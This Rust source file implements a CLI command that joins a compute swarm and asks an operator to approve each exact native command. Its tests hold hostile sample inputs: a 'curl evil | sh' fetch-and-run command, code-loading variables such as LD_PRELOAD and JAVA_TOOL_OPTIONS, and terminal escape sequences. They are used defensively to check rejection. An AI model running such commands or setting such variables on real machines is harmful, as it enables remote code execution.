//! `nuee join`: lend this machine to a compute swarm.

use std::io::IsTerminal as _;
use std::process::ExitCode;
use std::sync::Arc;

use nuee_core::{WorkerConfig, WorkerEvent};
use nuee_net::{JoinError, NetError, WorkerHostEvent, join_with};
use nuee_proto::{
    BoundedString, BoundedVec, ByeReason, Caps, Link, LocalLimits, Manifest, TaskKind,
};
use nuee_store::{HubConfig, StoreHub};
use serde_json::json;
use tokio::sync::mpsc;

use nuee_exec::{AllowEntry, ExecApproval, ExecPolicy, NativeRunner, Sandbox};

use super::run::WasmExec;
use crate::{Ctx, exit, fail};

/// Arguments of `nuee join`.
#[derive(Debug, clap::Args)]
pub struct Args {
    /// The swarm link, or `-` to read it from stdin
    pub link: String,
    /// Tasks run at once (default: half the cores)
    #[arg(long, value_name = "N")]
    pub slots: Option<u16>,
    /// Offer the GPU
    #[arg(long)]
    pub gpu: bool,
    /// Accept native commands from this repository revision (repo@rev); each exact command is
    /// still shown and asked about on a terminal, or must be in --exec-approvals
    #[arg(long, value_name = "REPO@REV")]
    pub allow_exec: Vec<String>,
    /// Run without asking the exact native commands listed in FILE (one JSON object per line:
    /// {"repo", "rev", "argv", "env"}; the prompt prints the line for each command)
    #[arg(long, value_name = "FILE")]
    pub exec_approvals: Option<std::path::PathBuf>,
    /// Let allowed native commands use the network
    #[arg(long)]
    pub exec_network: bool,
    /// Fetch the allowed repository URL from a local clone instead (offline or air-gapped
    /// machines; every allowed entry must name URL)
    #[arg(long, value_name = "URL=PATH")]
    pub exec_mirror: Option<String>,
    /// Storage offered to the swarm, such as 10GiB
    #[arg(long, value_name = "QUOTA")]
    pub store: Option<String>,
    /// Local LLM endpoint offered to the swarm
    #[arg(long, value_name = "URL")]
    pub llm: Option<String>,
}

fn ended(reason: ByeReason) -> anyhow::Result<ExitCode> {
    match reason {
        ByeReason::Done => Ok(ExitCode::SUCCESS),
        ByeReason::Banned => Err(fail(
            exit::MISMATCH,
            "banned by the coordinator after a result mismatch",
        )),
        ByeReason::Rejected => Err(fail(exit::REFUSED, "the coordinator rejected this peer")),
        ByeReason::Full => Err(fail(exit::REFUSED, "the swarm is full")),
        ByeReason::Shutdown => Err(fail(exit::ENDED, "the coordinator ended the swarm")),
    }
}

/// One `--exec-approvals` line: the exact command, as the prompt prints it.
pub(crate) fn approval_line(a: &ExecApproval) -> String {
    let env: serde_json::Map<String, serde_json::Value> = a
        .env
        .iter()
        .map(|(k, v)| (k.clone(), serde_json::Value::from(v.as_str())))
        .collect();
    crate::ui::clean_json(
        &json!({ "repo": a.repo, "rev": a.rev, "argv": a.argv, "env": env }).to_string(),
    )
}

/// Parses an `--exec-approvals` file: one JSON object per line, blank lines and `#` comments
/// skipped.
pub(crate) fn parse_approvals(text: &str) -> anyhow::Result<Vec<ExecApproval>> {
    #[derive(serde::Deserialize)]
    #[serde(deny_unknown_fields)]
    struct Line {
        repo: String,
        rev: String,
        argv: Vec<String>,
        #[serde(default)]
        env: std::collections::BTreeMap<String, String>,
    }
    let mut out = Vec::new();
    for (n, line) in text.lines().enumerate() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        let bad = |e: String| fail(exit::USAGE, format!("--exec-approvals line {}: {e}", n + 1));
        let l: Line = serde_json::from_str(line).map_err(|e| bad(e.to_string()))?;
        let a = ExecApproval::new(&l.repo, &l.rev, l.argv, l.env.into_iter().collect())
            .map_err(|e| bad(e.to_string()))?;
        if !out.contains(&a) {
            out.push(a);
        }
    }
    Ok(out)
}

/// The revisions the operator pinned with `--allow-exec`: the only ones a prompt may ask about.
fn pinned(args: &Args) -> anyhow::Result<Vec<AllowEntry>> {
    let mut out: Vec<AllowEntry> = Vec::new();
    for entry in &args.allow_exec {
        let parsed: AllowEntry = entry
            .parse()
            .map_err(|e| fail(exit::USAGE, format!("--allow-exec {entry}: {e}")))?;
        if !out.contains(&parsed) {
            out.push(parsed);
        }
    }
    Ok(out)
}

/// The native runner when `--allow-exec` or `--exec-approvals` was given; exec stays off
/// otherwise. `session` holds the commands approved at the prompt.
fn native_runner(
    args: &Args,
    session: &[ExecApproval],
    ctx: &Ctx,
) -> anyhow::Result<Option<Arc<NativeRunner>>> {
    let mut approved = match &args.exec_approvals {
        Some(path) => {
            let text = std::fs::read_to_string(path).map_err(|e| {
                fail(
                    exit::USAGE,
                    format!("--exec-approvals {}: {e}", path.display()),
                )
            })?;
            parse_approvals(&text)?
        }
        None => Vec::new(),
    };
    approved.extend(session.iter().cloned());
    if args.allow_exec.is_empty() && approved.is_empty() {
        if args.exec_network || args.exec_mirror.is_some() {
            return Err(fail(
                exit::USAGE,
                "--exec-network and --exec-mirror need --allow-exec or --exec-approvals",
            ));
        }
        return Ok(None);
    }
    let mut policy = ExecPolicy::new(ctx.data_dir()?.join("exec"));
    for parsed in pinned(args)? {
        if !policy.allow.contains(&parsed) {
            policy.allow.push(parsed);
        }
    }
    for a in approved {
        policy.add(a);
    }
    if policy.allow.len() > 16 {
        return Err(fail(exit::USAGE, "at most 16 allowed repository revisions"));
    }
    policy.repo_source =
        super::run::exec_mirror_source(args.exec_mirror.as_deref(), &policy.allow)?;
    policy.network = args.exec_network;
    let runner = NativeRunner::new(policy);
    if runner.sandbox() == Sandbox::None {
        ctx.ui
            .note("warning: no sandbox-exec or bwrap here; native commands will run unconfined");
    }
    Ok(Some(Arc::new(runner)))
}

fn advertised(native: Option<&NativeRunner>) -> anyhow::Result<BoundedVec<BoundedString<160>, 16>> {
    let list = native.map(NativeRunner::advertised).unwrap_or_default();
    let mut out = Vec::with_capacity(list.len());
    for e in list {
        out.push(
            BoundedString::try_from(e.as_str())
                .map_err(|_| fail(exit::USAGE, format!("--allow-exec {e}: too long")))?,
        );
    }
    BoundedVec::try_from(out).map_err(|_| fail(exit::USAGE, "at most 16 --allow-exec entries"))
}

/// The exact command of `manifest` when it is a native job this node has not approved and
/// nobody declined; `None` for other jobs and for commands no approval may cover.
fn unapproved(
    manifest: &Manifest,
    approved: &[ExecApproval],
    declined: &[ExecApproval],
) -> Option<ExecApproval> {
    if !matches!(manifest.kind, TaskKind::Exec | TaskKind::TrainExec) {
        return None;
    }
    let cmd = ExecApproval::of(manifest.exec.as_ref()?).ok()?;
    (!approved.contains(&cmd) && !declined.contains(&cmd)).then_some(cmd)
}

/// The command to ask about: an unapproved native job whose `repo@rev` the operator pinned with
/// `--allow-exec`, with a terminal to ask on. Without that pin nothing is asked: exec stays off.
fn exec_prompt(
    manifest: &Manifest,
    pinned: &[AllowEntry],
    approved: &[ExecApproval],
    declined: &[ExecApproval],
    interactive: bool,
) -> Option<ExecApproval> {
    if !interactive {
        return None;
    }
    unapproved(manifest, approved, declined).filter(|cmd| pinned.contains(&cmd.entry()))
}

/// Shows everything an exec job would run (argv and environment in full) and asks the operator.
fn ask_exec(ctx: &Ctx, manifest: &Manifest, cmd: &ExecApproval) -> anyhow::Result<bool> {
    let Some(spec) = &manifest.exec else {
        return Ok(false);
    };
    eprintln!("job {} wants to run a native command:", manifest.job);
    eprintln!("  repo    {}", cmd.repo);
    eprintln!("  rev     {}", cmd.rev);
    eprintln!("  argv    {}", crate::ui::clean(&format!("{:?}", cmd.argv)));
    if cmd.env.is_empty() {
        eprintln!("  env     -");
    }
    for (k, v) in &cmd.env {
        eprintln!("  env     {k}={}", crate::ui::clean(&format!("{v:?}")));
    }
    eprintln!("  timeout {} s", spec.timeout_s);
    eprintln!("  gpu     {}", if spec.gpu { "yes" } else { "no" });
    eprintln!("  to allow it without this prompt, put this line in an --exec-approvals file:");
    eprintln!("  {}", approval_line(cmd));
    ctx.ui
        .confirm("Allow exactly this command to run on this machine?")
}

/// Parses a storage quota such as `10GiB`, `500MB` or `2048` (MiB without a unit) into bytes.
pub fn parse_quota(text: &str) -> anyhow::Result<u64> {
    let t = text.trim();
    let split = t.find(|c: char| !c.is_ascii_digit()).unwrap_or(t.len());
    let (num, unit) = t.split_at(split);
    let bad = || {
        fail(
            exit::USAGE,
            format!("--store {text}: expected a size such as 10GiB"),
        )
    };
    let n: u64 = num.parse().map_err(|_| bad())?;
    let mult: u64 = match unit.trim().to_ascii_lowercase().as_str() {
        "" | "m" | "mb" | "mib" => 1 << 20,
        "k" | "kb" | "kib" => 1 << 10,
        "g" | "gb" | "gib" => 1 << 30,
        "t" | "tb" | "tib" => 1 << 40,
        _ => return Err(bad()),
    };
    let bytes = n.checked_mul(mult).ok_or_else(bad)?;
    if bytes < 1 << 20 {
        return Err(fail(exit::USAGE, format!("--store {text}: at least 1MiB")));
    }
    Ok(bytes)
}

/// Joins a swarm and runs its tasks until the coordinator says goodbye.
pub async fn run(args: Args, ctx: &Ctx) -> anyhow::Result<ExitCode> {
    let text = crate::link_arg(&args.link)?;
    let link = match Link::parse(&text).map_err(crate::link_failure)? {
        Link::Job(l) => l,
        Link::File(_) | Link::Site(_) => {
            return Err(fail(
                exit::USAGE,
                "this is a file link: use `nuee get` to download it",
            ));
        }
        Link::Service(_) => {
            return Err(fail(
                exit::USAGE,
                "this is a service link: use `nuee connect`",
            ));
        }
    };
    let fp = nuee_proto::fingerprint(&link.coordinator);
    ctx.ui.emit(
        "coordinator",
        json!({ "id": link.coordinator.to_string(), "fingerprint": fp.to_vec() }),
    );
    if !ctx.ui.is_json() {
        ctx.ui.say(&format!(
            "coordinator fingerprint {}  (compare with the coordinator's screen)",
            fp.join(" ")
        ));
    }
    let slots = args.slots.unwrap_or_else(crate::default_slots).max(1);

    let store_quota = args.store.as_deref().map(parse_quota).transpose()?;
    let gpu = if args.gpu {
        let runner = tokio::task::spawn_blocking(nuee_gpu::GpuRunner::new)
            .await?
            .ok_or_else(|| fail(exit::ERROR, "--gpu: no usable GPU adapter on this machine"))?;
        ctx.ui.note(&format!(
            "offering the GPU {}",
            runner.caps().adapter.as_str()
        ));
        Some(Arc::new(runner))
    } else {
        None
    };

    let llm = match &args.llm {
        Some(url) => {
            let ep =
                nuee_gpu::llm::LlmEndpoint::new(url).map_err(|e| fail(exit::USAGE, e.detail))?;
            ctx.ui.note(&format!(
                "offering LLM scoring with {}",
                ep.completions_url()
            ));
            Some(Arc::new(ep))
        }
        None => None,
    };

    // Embedding leases load the pinned model on first use (downloaded once, hash-checked).
    let embedder = Arc::new(crate::cmd::embed::LocalEmbedder::new(&ctx.data_dir()?));
    let net = ctx.online_net().await?;
    // A store member keeps its copies on disk and serves them; others only cache in memory.
    let (hub, router) = match store_quota {
        Some(quota) => {
            let hub = ctx.hub(&net).await?;
            let path = nuee_store::durable::StoreMember::default_registry(&ctx.data_dir()?);
            let registry = nuee_store::Registry::load(&path).map_err(crate::store_failure)?;
            let member = nuee_store::durable::StoreMember::new(&hub, &link, quota, registry)
                .map_err(crate::store_failure)?;
            ctx.ui.note(&format!(
                "offering {} MiB of storage, {} MiB in use",
                quota / (1024 * 1024),
                member.used() / (1024 * 1024)
            ));
            (hub, member.spawn())
        }
        None => {
            let hub = StoreHub::memory(&net, HubConfig::default());
            let router = net
                .router()
                .accept(iroh_blobs::ALPN, hub.protocol())
                .spawn();
            (hub, router)
        }
    };
    let relay = Ctx::relay_string(&net);
    let interactive = std::io::stdin().is_terminal() && std::io::stderr().is_terminal();
    let pinned = pinned(&args)?;
    let mut declined: Vec<ExecApproval> = Vec::new();
    // Commands approved at the prompt during this run.
    let mut session: Vec<ExecApproval> = Vec::new();
    let (ran_tx, mut ran_rx) = mpsc::unbounded_channel();
    let mut tasks = 0u64;
    let stop = crate::ctrl_c();
    tokio::pin!(stop);
    // Caps are only sent in Hello: a newly allowed command means leaving and joining again.
    let res = 'session: loop {
        let native = native_runner(&args, &session, ctx)?;
        let approved: Vec<ExecApproval> = native
            .as_ref()
            .map(|n| n.policy().approved.clone())
            .unwrap_or_default();
        let exec_allow = advertised(native.as_deref())?;
        let caps = Caps {
            agent: BoundedString::try_from(format!("nuee-cli/{}", env!("CARGO_PKG_VERSION")))
                .unwrap_or_default(),
            browser: false,
            cpu_slots: slots,
            gpu: gpu.as_ref().map(|g| g.caps().clone()),
            mem_mb: 1024,
            kinds: TaskKind::Wasm.bit()
                | TaskKind::TrainWasm.bit()
                | native
                    .as_ref()
                    .map_or(0, |_| TaskKind::Exec.bit() | TaskKind::TrainExec.bit())
                | gpu.as_ref().map_or(0, |_| TaskKind::Wgsl.bit())
                | llm.as_ref().map_or(0, |_| TaskKind::Llm.bit())
                | TaskKind::Embed.bit(),
            cached: BoundedVec::new(),
            exec_allow,
            store_quota_mb: store_quota.map_or(0, |b| (b / (1024 * 1024)).max(1)),
            relay: BoundedString::try_from(relay.as_str())
                .ok()
                .filter(|r| !r.is_empty()),
            rtc: false,
        };
        let mut exec = WasmExec::new(Some(ran_tx.clone()))?;
        if let Some(native) = native {
            exec = exec.with_native(native);
        }
        if let Some(gpu) = &gpu {
            exec = exec.with_gpu(gpu.clone());
        }
        if let Some(llm) = &llm {
            exec = exec.with_llm(llm.clone());
        }
        exec = exec.with_embed(embedder.clone());
        let exec = Arc::new(exec);
        let cfg = WorkerConfig {
            caps,
            limits: LocalLimits::default(),
        };
        // Told while it waits, not once approved: the wait can last.
        let pending = || {
            ctx.ui.emit("pending", json!({}));
            ctx.ui
                .note("waiting for the coordinator to approve this peer");
        };
        let joined = join_with(&net, &link, cfg, exec, Arc::new(hub.clone()), pending).await;
        let mut handle = match joined {
            Ok(h) => h,
            Err(e) => {
                if let Err(err) = router.shutdown().await {
                    tracing::debug!("closing the endpoint: {err}");
                }
                return Err(match e {
                    JoinError::Refused(Some(ByeReason::Banned)) => {
                        fail(exit::MISMATCH, "this peer is banned from the swarm")
                    }
                    JoinError::Refused(Some(ByeReason::Full)) => {
                        fail(exit::REFUSED, "the swarm is full")
                    }
                    JoinError::Refused(_) => fail(
                        exit::REFUSED,
                        "admission refused: the link may be wrong, expired or rejected",
                    ),
                    JoinError::Net(NetError::RelayUnreachable) => crate::relay_unreachable(),
                    JoinError::Net(e) => fail(
                        exit::NETWORK,
                        format!("cannot reach the coordinator ({e}): is it still running?"),
                    ),
                    JoinError::Handshake(why) => fail(
                        exit::NETWORK,
                        format!("cannot reach the coordinator ({why}): is it still running?"),
                    ),
                });
            }
        };

        let session = loop {
            tokio::select! {
                Some(ran) = ran_rx.recv() => {
                    if ran.ok {
                        tasks += 1;
                    }
                    ctx.ui.emit("task", json!({ "lease": ran.lease, "job": ran.job,
                        "task": ran.task, "ms": ran.ms, "ok": ran.ok }));
                    if !ctx.ui.is_json() {
                        let status = if ran.ok { "done" } else { "failed" };
                        ctx.ui.note(&format!("task {} {status} in {} ms ({tasks} so far)", ran.task, ran.ms));
                    }
                }
                ev = handle.events.recv() => {
                    let Some(ev) = ev else {
                        break Some(Err(fail(exit::ENDED, "the connection to the coordinator ended")));
                    };
                    match ev {
                        WorkerHostEvent::Welcomed => {
                            ctx.ui.emit("welcome", json!({ "slots": slots }));
                            ctx.ui.note(&format!("joined with {slots} slots"));
                        }
                        WorkerHostEvent::Event(WorkerEvent::JobAdded { job, name, manifest }) => {
                            ctx.ui.emit("job", json!({ "job": job, "name": name }));
                            ctx.ui.note(&format!("job {job}: {}", crate::ui::clean(&name)));
                            if let Some(cmd) =
                                exec_prompt(&manifest, &pinned, &approved, &declined, interactive)
                            {
                                if ask_exec(ctx, &manifest, &cmd)? {
                                    session.push(cmd);
                                    if handle.stop().is_err() {
                                        tracing::debug!("the worker had already stopped");
                                    }
                                    break None;
                                }
                                declined.push(cmd);
                            } else if let Some(cmd) = unapproved(&manifest, &approved, &declined) {
                                ctx.ui.note(&format!(
                                    "job {job} runs a native command this machine has not approved; \
                                     to run it, add this line to an --exec-approvals file and join \
                                     again:\n  {}",
                                    approval_line(&cmd)
                                ));
                                declined.push(cmd);
                            }
                        }
                        WorkerHostEvent::Event(WorkerEvent::JobRejected { reason }) => {
                            ctx.ui.emit("job_rejected", json!({ "reason": reason }));
                            ctx.ui.note(&format!("job refused: {}", crate::ui::clean(&reason)));
                        }
                        WorkerHostEvent::Event(_) => {}
                        WorkerHostEvent::Ended(reason) => break Some(ended(reason)),
                        WorkerHostEvent::Lost(why) => {
                            break Some(Err(fail(exit::ENDED, format!("lost the coordinator: {}", crate::ui::clean(&why)))));
                        }
                    }
                }
                () = &mut stop => {
                    if handle.stop().is_err() {
                        tracing::debug!("the worker had already stopped");
                    }
                    break Some(Err(fail(exit::CANCELLED, "interrupted; left the swarm")));
                }
            }
        };
        match session {
            Some(res) => break 'session res,
            None => {
                ctx.ui.emit("rejoin", json!({ "reason": "exec_allowed" }));
                ctx.ui.note("rejoining with the newly allowed command");
            }
        }
    };
    // Drain lease reports that raced with the goodbye.
    while let Ok(ran) = ran_rx.try_recv() {
        if ran.ok {
            tasks += 1;
        }
        ctx.ui.emit(
            "task",
            json!({ "lease": ran.lease, "job": ran.job, "task": ran.task, "ms": ran.ms, "ok": ran.ok }),
        );
    }
    ctx.ui.emit("ended", json!({ "tasks": tasks }));
    ctx.ui.note(&format!("left the swarm after {tasks} tasks"));
    if let Err(e) = router.shutdown().await {
        tracing::debug!("closing the endpoint: {e}");
    }
    res
}

#[cfg(test)]
mod tests {
    use nuee_proto::{Comparator, ExecSpec, SecretKey, VerifyPolicy};

    use super::*;

    const REV: &str = "0123456789abcdef0123456789abcdef01234567";
    const REPO: &str = "https://example.org/r.git";

    fn manifest(kind: TaskKind) -> Manifest {
        Manifest {
            version: nuee_proto::PROTO_VERSION,
            job: 1,
            name: BoundedString::new(),
            kind,
            module: None,
            module_size: 0,
            max_memory: 0,
            assets: BoundedVec::new(),
            tasks: 1,
            verify: VerifyPolicy::default(),
            compare: Comparator::Exact,
            deadline_ms: 60_000,
            exec: Some(ExecSpec {
                repo: BoundedString::try_from(REPO).expect("repo"),
                rev: BoundedString::try_from(REV).expect("rev"),
                argv: BoundedVec::new(),
                env: BoundedVec::new(),
                timeout_s: 10,
                gpu: false,
            }),
            train: None,
            coordinator: SecretKey::from_bytes(&[1; 32]).public(),
        }
    }

    fn pin() -> Vec<AllowEntry> {
        vec![AllowEntry::new(REPO, REV).expect("entry")]
    }

    fn with_command(mut m: Manifest, argv: &[&str], env: &[(&str, &str)]) -> Manifest {
        if let Some(spec) = m.exec.as_mut() {
            spec.argv = BoundedVec::try_from(
                argv.iter()
                    .map(|a| BoundedString::try_from(*a).expect("arg"))
                    .collect::<Vec<_>>(),
            )
            .expect("argv");
            spec.env = BoundedVec::try_from(
                env.iter()
                    .map(|(k, v)| nuee_proto::EnvVar {
                        key: BoundedString::try_from(*k).expect("key"),
                        value: BoundedString::try_from(*v).expect("value"),
                    })
                    .collect::<Vec<_>>(),
            )
            .expect("env");
        }
        m
    }

    #[test]
    fn prompts_only_for_new_exec_jobs_on_a_terminal() {
        let m = with_command(manifest(TaskKind::Exec), &["python", "train.py"], &[]);
        let cmd = ExecApproval::of(m.exec.as_ref().expect("exec")).expect("approvable");
        assert_eq!(exec_prompt(&m, &pin(), &[], &[], true), Some(cmd.clone()));
        assert_eq!(
            exec_prompt(&m, &pin(), &[], &[], false),
            None,
            "no terminal"
        );
        assert_eq!(
            exec_prompt(&m, &pin(), std::slice::from_ref(&cmd), &[], true),
            None,
            "already allowed"
        );
        assert_eq!(
            exec_prompt(&m, &pin(), &[], std::slice::from_ref(&cmd), true),
            None,
            "already declined"
        );
        assert_eq!(
            exec_prompt(&manifest(TaskKind::Wasm), &pin(), &[], &[], true),
            None
        );
        let train = with_command(manifest(TaskKind::TrainExec), &["python", "train.py"], &[]);
        assert!(
            exec_prompt(&train, &pin(), &[], &[], true).is_some(),
            "exec trainers too"
        );
    }

    /// A coordinator posts an exec job to a worker that never passed --allow-exec, or pinned
    /// another revision: nothing is asked, so one keystroke can never turn exec on.
    #[test]
    fn no_prompt_without_the_operators_pin() {
        let m = with_command(manifest(TaskKind::Exec), &["python", "train.py"], &[]);
        assert_eq!(
            exec_prompt(&m, &[], &[], &[], true),
            None,
            "no --allow-exec"
        );
        let other_rev = [AllowEntry::new(REPO, &"f".repeat(40)).expect("entry")];
        assert_eq!(
            exec_prompt(&m, &other_rev, &[], &[], true),
            None,
            "other revision"
        );
        let other_repo = [AllowEntry::new("https://example.org/other.git", REV).expect("entry")];
        assert_eq!(
            exec_prompt(&m, &other_repo, &[], &[], true),
            None,
            "other repository"
        );
        let train = with_command(manifest(TaskKind::TrainExec), &["python", "train.py"], &[]);
        assert_eq!(
            exec_prompt(&train, &[], &[], &[], true),
            None,
            "exec trainers too"
        );
        assert!(
            exec_prompt(&m, &pin(), &[], &[], true).is_some(),
            "pinned: asked"
        );
    }

    /// A job name and command with terminal control sequences are printed escaped, and the
    /// approval line stays valid JSON for the same command.
    #[test]
    fn approval_line_escapes_controls() {
        let cmd = ExecApproval::new(
            REPO,
            REV,
            vec![
                "python\u{9b}2K".into(),
                "\u{1b}[1A".into(),
                "\u{202e}x".into(),
            ],
            vec![("MY_FLAG".into(), "\u{7f}\r".into())],
        )
        .expect("cmd");
        let line = approval_line(&cmd);
        assert!(!line.chars().any(char::is_control), "{line:?}");
        assert!(!line.contains('\u{202e}'), "{line:?}");
        assert_eq!(parse_approvals(&line).expect("parse"), vec![cmd]);
    }

    /// The operator approved X@rev for ["python", "train.py"]: another command or environment
    /// at the same revision is a new decision, never covered by the first approval.
    #[test]
    fn an_approval_covers_one_exact_command() {
        let ok = with_command(manifest(TaskKind::Exec), &["python", "train.py"], &[]);
        let approved = [ExecApproval::of(ok.exec.as_ref().expect("exec")).expect("approvable")];
        assert_eq!(exec_prompt(&ok, &pin(), &approved, &[], true), None);
        assert_eq!(unapproved(&ok, &approved, &[]), None);
        let evil = with_command(
            manifest(TaskKind::Exec),
            &["sh", "-c", "curl evil | sh"],
            &[],
        );
        let env = with_command(
            manifest(TaskKind::Exec),
            &["python", "train.py"],
            &[("MY_FLAG", "on")],
        );
        for m in [&evil, &env] {
            let cmd = exec_prompt(m, &pin(), &approved, &[], true).expect("asked again");
            assert_eq!(
                cmd,
                ExecApproval::of(m.exec.as_ref().expect("exec")).expect("cmd")
            );
            assert!(unapproved(m, &approved, &[]).is_some(), "no TTY: refused");
        }
        // Code-loading variables can never be approved, so they are never even offered.
        let java = with_command(
            manifest(TaskKind::Exec),
            &["python", "train.py"],
            &[("JAVA_TOOL_OPTIONS", "-javaagent:/tmp/x.jar")],
        );
        assert_eq!(exec_prompt(&java, &pin(), &approved, &[], true), None);
    }

    #[test]
    fn approval_lines_round_trip_and_stay_strict() {
        let cmd = ExecApproval::new(
            REPO,
            REV,
            vec![
                "python".into(),
                "train.py".into(),
                "--lr".into(),
                "0.1".into(),
            ],
            vec![("MY_FLAG".into(), "on \"quoted\"".into())],
        )
        .expect("cmd");
        let line = approval_line(&cmd);
        let text = format!("# approved commands\n\n{line}\n{line}\n");
        assert_eq!(parse_approvals(&text).expect("parse"), vec![cmd]);
        for bad in [
            format!(r#"{{"repo":"{REPO}","rev":"{REV}","argv":[]}}"#),
            format!(
                r#"{{"repo":"{REPO}","rev":"{REV}","argv":["x"],"env":{{"LD_PRELOAD":"/x"}}}}"#
            ),
            format!(
                r#"{{"repo":"{REPO}","rev":"{REV}","argv":["x"],"env":{{"NODE_OPTIONS":"-r x"}}}}"#
            ),
            format!(r#"{{"repo":"{REPO}","rev":"abc","argv":["x"]}}"#),
            format!(r#"{{"repo":"{REPO}","rev":"{REV}","argv":["x"],"extra":1}}"#),
            "not json".to_owned(),
        ] {
            assert!(parse_approvals(&bad).is_err(), "{bad} accepted");
        }
    }

    #[test]
    fn exec_mirror_stands_in_for_the_allowed_repository_only() {
        use nuee_exec::{AllowEntry, RepoSource};
        let allow = [AllowEntry::new(REPO, REV).expect("entry")];
        let dir = std::env::temp_dir();
        assert_eq!(
            super::super::run::exec_mirror_source(None, &allow).expect("none"),
            RepoSource::Https
        );
        let m = format!("{REPO}={}", dir.display());
        assert_eq!(
            super::super::run::exec_mirror_source(Some(&m), &allow).expect("mirror"),
            RepoSource::LocalMirror(dir.canonicalize().expect("canonical"))
        );
        let other = format!("https://example.org/other.git={}", dir.display());
        assert!(super::super::run::exec_mirror_source(Some(&other), &allow).is_err());
        assert!(super::super::run::exec_mirror_source(Some(REPO), &allow).is_err());
        let missing = format!("{REPO}={}", dir.join("nuee-no-such-dir").display());
        assert!(super::super::run::exec_mirror_source(Some(&missing), &allow).is_err());
    }
}
